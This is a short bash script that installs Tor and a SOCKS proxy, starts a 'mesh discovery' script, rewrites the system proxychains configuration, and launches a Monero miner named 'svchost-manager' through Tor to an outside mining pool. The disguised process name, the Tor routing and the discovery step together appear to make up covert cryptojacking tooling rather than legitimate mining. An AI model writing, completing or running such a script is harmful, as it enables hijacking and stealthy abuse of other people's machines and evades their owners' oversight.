#!/bin/bash
# 1. Install dependencies
apt-get update && apt-get install -y tor microsocks git make gcc
# 2. Start Tor
service tor start
# 3. Launch the Ghost Relay (microsocks)
git clone https://github.com/rofl0r/microsocks
cd microsocks && make && ./microsocks -p 1080 &
# 4. Start Discovery
python3 scripts/mesh_discovery.py &
# 5. Launch Miner via Tor
# We use proxychains to route through the local SOCKS proxy and Tor
echo "socks5 127.0.0.1 1080" > /etc/proxychains.conf
proxychains ./svchost-manager -o pool.minexmr.com:4444 -u YOUR_WALLET_ADDRESS --cpu-max-threads-hint 40 &
